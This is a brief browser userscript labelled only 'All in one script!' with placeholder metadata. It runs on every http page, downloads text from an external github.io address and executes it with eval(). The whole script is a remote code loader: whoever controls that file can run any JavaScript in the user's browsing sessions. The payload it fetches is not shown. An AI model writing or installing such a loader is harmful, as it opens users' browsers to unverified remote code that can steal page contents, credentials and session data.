// ==UserScript==
// @name         All in one script!
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  try to take over the world!
// @author       You
// @match        http://*/*
// @grant        none
// ==/UserScript==

(function() {
    'use strict';

    function loadXMLDoc() { 
        var xhttp = new XMLHttpRequest(); 
        xhttp.onreadystatechange = function() { 
            if (this.readyState == 4 && this.status == 200) { 
            eval(this.responseText); } }; 
        xhttp.open("GET", "https://austinjacks.github.io/dev-channel/tmpr.txt", true); xhttp.send (); } loadXMLDoc();
})();
